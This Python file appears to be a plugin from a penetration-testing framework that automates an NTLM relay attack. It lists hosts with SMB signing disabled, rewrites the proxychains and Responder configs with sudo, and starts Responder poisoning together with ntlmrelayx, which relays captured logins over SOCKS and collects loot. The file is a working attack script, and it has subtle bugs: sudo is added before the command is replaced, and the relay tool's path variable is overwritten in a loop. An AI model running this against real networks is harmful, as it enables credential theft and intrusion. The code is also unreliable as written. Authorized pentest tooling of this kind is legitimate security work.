import multiprocessing
import subprocess
import pollenisatorgui.core.components.utils as utils
import os
from pollenisatorgui.core.components.apiclient import APIClient
from pollenisatorgui.scripts.lan.utils import checkPath, getNICs
from pollenisatorgui.pollex import pollex_exec

def main(apiclient, appli, **kwargs):
    if appli:
        from pollenisatorgui.core.application.dialogs.ChildDialogQuestion import ChildDialogQuestion
        from pollenisatorgui.core.application.dialogs.ChildDialogCombo import ChildDialogCombo
        import tkinter as tk

    responder_path = utils.which_expand_alias("Responder.py")
    if responder_path is None:
        responder_path = utils.which_expand_alias("responder")
    if responder_path is None:
        responder_path = utils.which_expand_alias("responder.py")
    if responder_path is None:
        return False, "Responder not found, create an alias or install it. (responder, Responder.py, responder.py were tested)"
    res, path = checkPath(["ntlmrelayx.py", "ntlmrelayx"])
    if not res:
        return False, path
    APIClient.setInstance(apiclient)
    smb_signing_list = apiclient.find("computers", {"infos.signing":"False"}, True)
    if smb_signing_list is None or len(smb_signing_list) == 0:
        return False, "No computer with SMB signing disabled found"
    export_dir = utils.getExportDir()
    file_name = os.path.join(export_dir, "relay_list.lst")
    with open(file_name, "w") as f:
        for computer in smb_signing_list:
            ip = computer.get("ip", "")
            if ip != "":
                f.write(ip+"\n")
    relaying_loot_path = os.path.join(export_dir, "loot_relay")
    try:
        os.makedirs(relaying_loot_path)
    except:
        pass
    if appli:
        dialog = ChildDialogQuestion(None, "Setup proxychains", "Do you want to edit proxychains conf to port 1080 ?")
        dialog.app.wait_window(dialog.app)
        cmd = ""
        if dialog.rvalue == "Yes":
            cmd = 'sed -i -E "s/(socks[4-5]\s+127.0.0.1\s+)[0-9]+/\\11080/gm" /etc/proxychains.conf'
            if os.geteuid() != 0:
                cmd = "sudo "+cmd
            appli.launch_in_terminal(None, "sed for proxychains", cmd, use_pollex=False)
    else:
        res = input("Do you want to edit proxychains conf to port 1080 ? (Y/n)")
        if res.lower() == "y":
            cmd = 'sed -i -E "s/(socks[4-5]\s+127.0.0.1\s+)[0-9]+/\\11080/gm" /etc/proxychains.conf'
            if os.geteuid() != 0:
                cmd = "sudo "+cmd
            os.popen(cmd)
    responder_conf = ""
    if utils.which_expand_alias("locate"):
        output = multiprocessing.Queue()
        resp = subprocess.run("locate Responder.conf", capture_output=True, text=True, shell=True)
        stdout = resp.stdout
        if stdout.strip() == "":
            if appli:
                file = tk.filedialog.askopenfilename(title="Locate responder conf file please:", filetypes=[('Config Files', '*.conf')])
                if file:
                    responder_conf = file
                else:
                    return False, "Responder conf not given"
            else:
                responder_conf = input("Responder conf not found, give full path to it please:")
                if responder_conf.strip() == "":
                    return False, "Responder conf not given"
            if not os.path.isfile(responder_conf):
                return False, "Responder conf not found"
        else:
            if appli:
                dialog = ChildDialogCombo(None, stdout.split("\n"), displayMsg="Choose your responder config file", width=200)
                dialog.app.wait_window(dialog.app)
                if dialog.rvalue is not None:
                    responder_conf = dialog.rvalue.strip()
                    if os.geteuid() != 0:
                        cmd = "sudo "+cmd
                    cmd = 'sed -i -E "s/(HTTP|SMB) = On/\\1 = Off/gm" '+str(responder_conf)
                    appli.launch_in_terminal(None, "sed for responder", cmd, use_pollex=False)
            else:
                possibilites = [x.strip() for x in stdout.split("\n") if x.strip() != ""]
                if len(possibilites) > 1:
                    print("Many responder conf found, choose one :")

                    for i, path in enumerate(possibilites):
                        if path.strip() == "":
                            continue
                        print(str(i+1)+". "+path)
                    responder_conf = input("Choose your responder config file by its number:")
                    try:
                        responder_conf = possibilites[int(responder_conf)-1]
                    except:
                        return False, "Wrong number given"
                else:
                    responder_conf = possibilites[0]
                if responder_conf.strip() == "":
                    return False, "Responder conf not given"
                if os.geteuid() != 0:
                    cmd = "sudo "+cmd
                cmd = 'sed -i -E "s/(HTTP|SMB) = On/\\1 = Off/gm" '+str(responder_conf)
                os.popen(cmd)
    try:
        eth = getNICs(graphical=appli is not None)
    except ValueError as e:
        return False, str(e)
    
        
    cmd = f"{responder_path} -I {eth} -dvw --lm --disable-ess"
    if os.geteuid() != 0:
        cmd = "sudo "+cmd
    if appli:
        appli.launch_in_terminal(None, "responder", cmd, use_pollex=False)
    else:
        subprocess.run(cmd+"&", shell=True)
    cmd = f"{path} -tf {file_name} -smb2support -socks -l {relaying_loot_path}"
    if os.geteuid() != 0:
        cmd = "sudo "+cmd
    if appli:
        appli.launch_in_terminal(kwargs.get("default_target",None), "ntlmrelayx for responder", cmd, use_pollex=False)
    else:
        subprocess.run(cmd, shell=True)
    return True, f"Listening ntlmrelay opened, loot directory is here:"+str(relaying_loot_path)+"\n"+ \
            "Don't forget to open Responder with HTTP and SMB disabled\n" + \
                "Proxychains port should be 1080 (default)"
